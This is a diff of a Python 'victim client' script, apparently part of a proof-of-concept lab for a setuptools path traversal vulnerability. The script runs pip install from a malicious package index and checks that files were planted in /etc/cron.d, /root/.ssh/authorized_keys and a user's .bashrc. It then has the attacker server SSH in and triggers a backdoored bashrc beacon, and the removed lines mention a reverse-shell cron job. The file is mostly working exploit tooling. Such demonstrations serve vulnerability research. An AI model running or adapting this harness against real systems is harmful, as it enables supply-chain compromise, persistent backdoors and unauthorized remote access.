@@ -1,11 +1,14 @@
 #!/usr/bin/env python3
 """
-Victim Client - Demonstrates the path traversal vulnerability
+Victim Client - Triggers path traversal via pip install
 
-This simulates a developer/CI system that runs easy_install pointing
-to a malicious package index, triggering the path traversal vulnerability.
+Simply runs: pip install malicious-package --index-url http://server:8080/simple/
 
-The attack occurs during package resolution - before any code is even executed.
+The vulnerability triggers when:
+1. pip downloads and extracts the package
+2. setup.py runs with setup_requires=["triggerpkg"]
+3. setuptools' PackageIndex fetches triggerpkg from malicious server
+4. Server returns URL with path traversal, file written to arbitrary location
 """
 
 import os
@@ -14,193 +17,123 @@ import sys
 import time
 import urllib.request
 
-# Target directories that will be written to via path traversal
-TARGET_DIRS = [
-    "/etc/cron.d",
-    "/root/.ssh",
-    "/home/victim",
-]
+TARGET_DIRS = ["/etc/cron.d", "/root/.ssh", "/home/victim"]
 
 
 def setup_environment():
-    """Create target directories for container testing."""
-    print("[VICTIM] Setting up target directories...")
+    print("[VICTIM] Creating target directories...")
     for d in TARGET_DIRS:
         os.makedirs(d, exist_ok=True)
-        print(f"         Created: {d}")
 
 
 def wait_for_server(host, port, timeout=30):
-    """Wait for the malicious server to be available."""
     import socket
-    print(f"[VICTIM] Waiting for malicious server at {host}:{port}...")
-
+    print(f"[VICTIM] Waiting for server {host}:{port}...")
     start = time.time()
     while time.time() - start < timeout:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(1)
-            result = sock.connect_ex((host, port))
-            sock.close()
-            if result == 0:
-                print(f"[VICTIM] Server is up!")
+            if sock.connect_ex((host, port)) == 0:
+                sock.close()
+                print("[VICTIM] Server is up!")
                 return True
+            sock.close()
         except:
             pass
         time.sleep(1)
-
-    print(f"[VICTIM] Timeout waiting for server")
     return False
 
 
-def run_pip_install_attack(server_host, server_port, scenario_name):
-    """
-    Execute the attack using pip/easy_install pointing to malicious index.
-
-    This simulates a real-world attack where a developer or CI system
-    installs a package from a compromised or typosquatted package index.
-    """
-    print(f"\n{'=' * 60}")
-    print(f"EXECUTING ATTACK: {scenario_name.upper()}")
-    print("=" * 60)
-
-    # Switch scenario on server
-    try:
-        urllib.request.urlopen(f"http://{server_host}:{server_port}/scenario/{scenario_name}")
-    except:
-        pass
-
-    time.sleep(0.5)
-
-    index_url = f"http://{server_host}:{server_port}/simple/"
+def run_attack(server_host, server_port, scenario):
+    """Run pip install and check if path traversal succeeded."""
 
     targets = {
         "cron": "/etc/cron.d/backdoor",
         "ssh": "/root/.ssh/authorized_keys",
         "bashrc": "/home/victim/.bashrc",
     }
-    target = targets.get(scenario_name, targets["cron"])
+    target = targets[scenario]
 
-    print(f"\n[VICTIM] Simulating: Developer installs package from untrusted index")
-    print(f"[VICTIM] Command: easy_install --index-url {index_url} malicious-package")
-    print(f"[VICTIM] Target file: {target}")
-    print()
+    print(f"\n{'='*60}")
+    print(f"ATTACK: {scenario.upper()}")
+    print(f"{'='*60}")
 
-    # Use easy_install which uses setuptools' vulnerable PackageIndex
-    # The vulnerability triggers during the package resolution/download phase
-    easy_install_code = f'''
-import sys
-from setuptools.command.easy_install import main
-sys.argv = ["easy_install", "--index-url", "{index_url}", "malicious-package"]
-main()
-'''
+    # Set scenario on server
+    try:
+        urllib.request.urlopen(f"http://{server_host}:{server_port}/scenario/{scenario}")
+    except:
+        pass
+    time.sleep(0.5)
+
+    index_url = f"http://{server_host}:{server_port}/simple/"
+
+    print(f"\n[VICTIM] Running: pip install malicious-package --index-url {index_url}")
+    print(f"[VICTIM] Expected write: {target}\n")
+
+    # THE ATTACK: just pip install from malicious index
     result = subprocess.run(
-        [sys.executable, "-c", easy_install_code],
+        [
+            sys.executable, "-m", "pip", "install",
+            "--index-url", index_url,
+            "--trusted-host", server_host,
+            "--no-cache-dir",
+            "--force-reinstall",
+            "malicious-package"
+        ],
         capture_output=True,
         text=True,
-        timeout=30
+        timeout=60
     )
 
-    print("[VICTIM] easy_install output:")
-    print("-" * 40)
-    if result.stdout:
-        print(result.stdout)
+    print("[OUTPUT]")
+    print(result.stdout)
     if result.stderr:
         print(result.stderr)
-    print("-" * 40)
 
-    # Check if attack succeeded (file written via path traversal)
+    # Check if file was written via path traversal
     if os.path.exists(target):
-        print(f"\n[EXPLOITED] File written to: {target}")
-        print(f"\n[FILE CONTENTS]")
+        print(f"\n[EXPLOITED] File written: {target}")
         print("-" * 40)
-        with open(target, 'r') as f:
+        with open(target) as f:
             print(f.read())
         print("-" * 40)
         return True
     else:
-        print(f"\n[FAILED] File not created at: {target}")
+        print(f"\n[FAILED] {target} not created")
         return False
 
 
-def validate_attacks(server_host, server_port):
-    """Validate that the attacks had real impact."""
+def validate(server_host, server_port):
+    """Validate attack impact."""
+    print(f"\n{'='*60}")
+    print("VALIDATION")
+    print(f"{'='*60}")
 
-    # 1. Validate SSH - have attacker try to connect back
-    print("\n[VALIDATION 1] SSH Key Injection")
-    print("-" * 40)
+    # SSH validation
     if os.path.exists("/root/.ssh/authorized_keys"):
-        print("[+] authorized_keys file exists")
-        with open("/root/.ssh/authorized_keys", 'r') as f:
-            key = f.read().strip()
-        print(f"[+] Injected key: {key[:60]}...")
-
-        # Ask attacker server to validate SSH access
-        print("[*] Requesting attacker to validate SSH access...")
-        time.sleep(1)  # Give sshd time to see the key
+        print("\n[SSH] authorized_keys exists:")
+        with open("/root/.ssh/authorized_keys") as f:
+            print(f.read()[:100])
+        print("[*] Asking attacker to SSH in...")
         try:
-            resp = urllib.request.urlopen(
-                f"http://{server_host}:{server_port}/validate/ssh",
-                timeout=15
-            )
-            result = resp.read().decode()
-            if "SSH_ACCESS_CONFIRMED" in result or "ACCESS CONFIRMED" in result:
-                print("[!] ATTACKER SUCCESSFULLY SSH'd INTO VICTIM!")
-            else:
-                print("[-] SSH validation returned but no confirmation")
+            resp = urllib.request.urlopen(f"http://{server_host}:{server_port}/validate/ssh", timeout=15)
+            if b"SSH_OK" in resp.read():
+                print("[!] ATTACKER SSH'd INTO VICTIM!")
         except Exception as e:
-            print(f"[-] SSH validation request failed: {e}")
-    else:
-        print("[-] authorized_keys not found")
+            print(f"[-] SSH validation: {e}")
 
-    # 2. Validate Cron
-    print("\n[VALIDATION 2] Cron Backdoor")
-    print("-" * 40)
+    # Cron validation
     if os.path.exists("/etc/cron.d/backdoor"):
-        print("[+] Cron backdoor file exists")
-        with open("/etc/cron.d/backdoor", 'r') as f:
-            content = f.read()
-        print(f"[+] Cron job content:")
-        print(content)
-        if "server" in content and "4444" in content:
-            print("[!] REVERSE SHELL CRON JOB INSTALLED!")
-            print("[!] Would connect to attacker every minute")
-    else:
-        print("[-] Cron backdoor not found")
+        print("\n[CRON] backdoor exists:")
+        with open("/etc/cron.d/backdoor") as f:
+            print(f.read())
 
-    # 3. Validate Bashrc - trigger the beacon
-    print("\n[VALIDATION 3] Bashrc Backdoor")
-    print("-" * 40)
+    # Bashrc validation
     if os.path.exists("/home/victim/.bashrc"):
-        print("[+] Backdoored .bashrc exists")
-        with open("/home/victim/.bashrc", 'r') as f:
-            content = f.read()
-        print("[+] Bashrc content:")
-        print(content)
-
-        print("[*] Triggering bashrc by spawning login shell...")
-        try:
-            # Source the bashrc to trigger the beacon
-            subprocess.run(
-                ["bash", "-c", "source /home/victim/.bashrc"],
-                timeout=5,
-                capture_output=True
-            )
-            print("[*] Bashrc sourced - check attacker server for beacon")
-            time.sleep(2)
-
-            # Check if beacon was received
-            resp = urllib.request.urlopen(
-                f"http://{server_host}:{server_port}/status",
-                timeout=5
-            )
-            status = resp.read().decode()
-            if "victim" in status.lower() or "Beacons Received" in status:
-                print("[!] BEACON CALLBACK CONFIRMED ON ATTACKER SERVER!")
-        except Exception as e:
-            print(f"[-] Bashrc trigger failed: {e}")
-    else:
-        print("[-] Backdoored bashrc not found")
+        print("\n[BASHRC] backdoor exists, triggering...")
+        subprocess.run(["bash", "-c", "source /home/victim/.bashrc"], capture_output=True, timeout=5)
+        time.sleep(2)
 
 
 def main():
@@ -208,56 +141,32 @@ def main():
     server_port = int(os.environ.get("SERVER_PORT", "8080"))
 
     print("=" * 60)
-    print("SETUPTOOLS PATH TRAVERSAL VULNERABILITY DEMO")
+    print("SETUPTOOLS PATH TRAVERSAL - PIP INSTALL ATTACK")
     print("=" * 60)
-    print()
-    print("This demonstrates CVE in setuptools where a malicious package")
-    print("index can write files to arbitrary paths during package install.")
-    print()
-    print("Attack vector: Developer runs easy_install with untrusted index")
-    print(f"Malicious index: http://{server_host}:{server_port}/simple/")
-    print()
 
-    # Setup
     setup_environment()
 
-    # Wait for server
     if not wait_for_server(server_host, server_port):
-        print("[VICTIM] Could not connect to server, exiting")
+        print("[VICTIM] Server not reachable")
         sys.exit(1)
 
     time.sleep(1)
 
-    # Run all three attack scenarios
-    scenarios = ["cron", "ssh", "bashrc"]
     results = []
-
-    for scenario in scenarios:
-        success = run_pip_install_attack(server_host, server_port, scenario)
-        results.append((scenario, success))
+    for scenario in ["cron", "ssh", "bashrc"]:
+        results.append((scenario, run_attack(server_host, server_port, scenario)))
         time.sleep(1)
 
-    # Summary
-    print(f"\n{'=' * 60}")
-    print("ATTACK SUMMARY")
+    print(f"\n{'='*60}")
+    print("SUMMARY")
     print("=" * 60)
+    for name, success in results:
+        print(f"  [{('EXPLOITED' if success else 'FAILED')}] {name}")
 
-    for scenario, success in results:
-        status = "EXPLOITED" if success else "FAILED"
-        print(f"  [{status}] {scenario}")
+    validate(server_host, server_port)
 
-    print(f"\n[PROOF] Files created outside download directory:")
-    os.system("find /etc/cron.d /root/.ssh /home/victim -type f 2>/dev/null")
-
-    # Validate attacks
-    print(f"\n{'=' * 60}")
-    print("VALIDATING ATTACKS")
-    print("=" * 60)
-
-    validate_attacks(server_host, server_port)
-
-    print(f"\n{'=' * 60}")
-    print("DEMONSTRATION COMPLETE")
+    print(f"\n{'='*60}")
+    print("COMPLETE")
     print("=" * 60)
 
     return 0 if all(r[1] for r in results) else 1
